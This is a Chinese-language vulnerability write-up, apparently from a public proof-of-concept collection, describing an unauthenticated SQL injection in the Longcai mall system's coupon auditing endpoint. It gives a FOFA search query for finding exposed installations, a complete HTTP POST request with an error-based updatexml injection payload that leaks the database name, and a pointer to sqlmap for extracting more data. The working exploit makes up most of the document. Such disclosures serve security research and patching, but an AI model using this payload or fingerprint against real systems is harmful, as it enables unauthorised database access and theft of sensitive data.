# 龙采商城系统新人礼包权限开关处存在未授权SQL注入

### 一、漏洞描述
龙采科技集团有限责任公司龙采商城系统新人礼包权限开关处存在未授权SQL注入，可直接无需登录后台即可暴露出数据库敏感信息。

### 二、影响版本
龙采商城系统

### 三、资产测绘
FOFA：body="'url':'/pc2.0/index/index'"

界面框架大致如下：

![1715913715272-6b2b1541-925a-4122-a1c1-739f56e008d1.png](./img/-LguuObqFJEiyiS4/1715913715272-6b2b1541-925a-4122-a1c1-739f56e008d1-967924.png)

### 四、漏洞复现
```plain
POST /coupon/auditing HTTP/1.1
Host: xxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 60
Connection: close

id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)


```

使用burp请求POC即可暴出敏感数据库（也可以采用sqlmap跑出大量敏感信息）

![1715913259926-c5a808ea-5281-4129-abb9-f358ef824dab.png](./img/-LguuObqFJEiyiS4/1715913259926-c5a808ea-5281-4129-abb9-f358ef824dab-585388.png)



> 更新: 2024-06-01 11:14:23  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ohz4lxse6x8dctsn>